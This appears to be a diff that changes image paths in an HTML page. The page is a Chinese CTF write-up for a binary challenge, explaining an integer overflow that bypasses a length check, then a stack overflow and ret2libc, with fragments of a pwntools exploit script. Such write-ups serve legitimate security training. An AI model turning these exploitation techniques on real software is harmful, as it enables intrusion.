@@ -39,9 +39,9 @@
 <p>1、无符号整形溢出</p>
 <p>2、64位栈溢出</p>
 <p>3、ret2libc1</p>
-<p><img src="images/image-20200505233702259.png" alt="image-20200505233702259"></p>
+<p><img src="/images/image-20200505233702259.png" alt="image-20200505233702259"></p>
 <p>nbytes是size_t类型相当于unsigned int，在if判断中又强制转换为有符号整形，所以存在整形溢出，输入&rdquo;-1&quot;就可以绕过if判断，并且使read函数可以读入的数据非常大造成栈溢出</p>
-<p><img src="images/image-20200505234220516.png" alt="image-20200505234220516"></p>
+<p><img src="/images/image-20200505234220516.png" alt="image-20200505234220516"></p>
 <p>本题存在后门，接下来就是常规的ret2libc1</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
 <span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
@@ -63,7 +63,7 @@ payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span>
 sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">name?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,payload)
 sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
 sh<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><img src="images/image-20200505234442937.png" alt="image-20200505234442937"></p>
+</code></pre></div><p><img src="/images/image-20200505234442937.png" alt="image-20200505234442937"></p>
 
 </main>
 
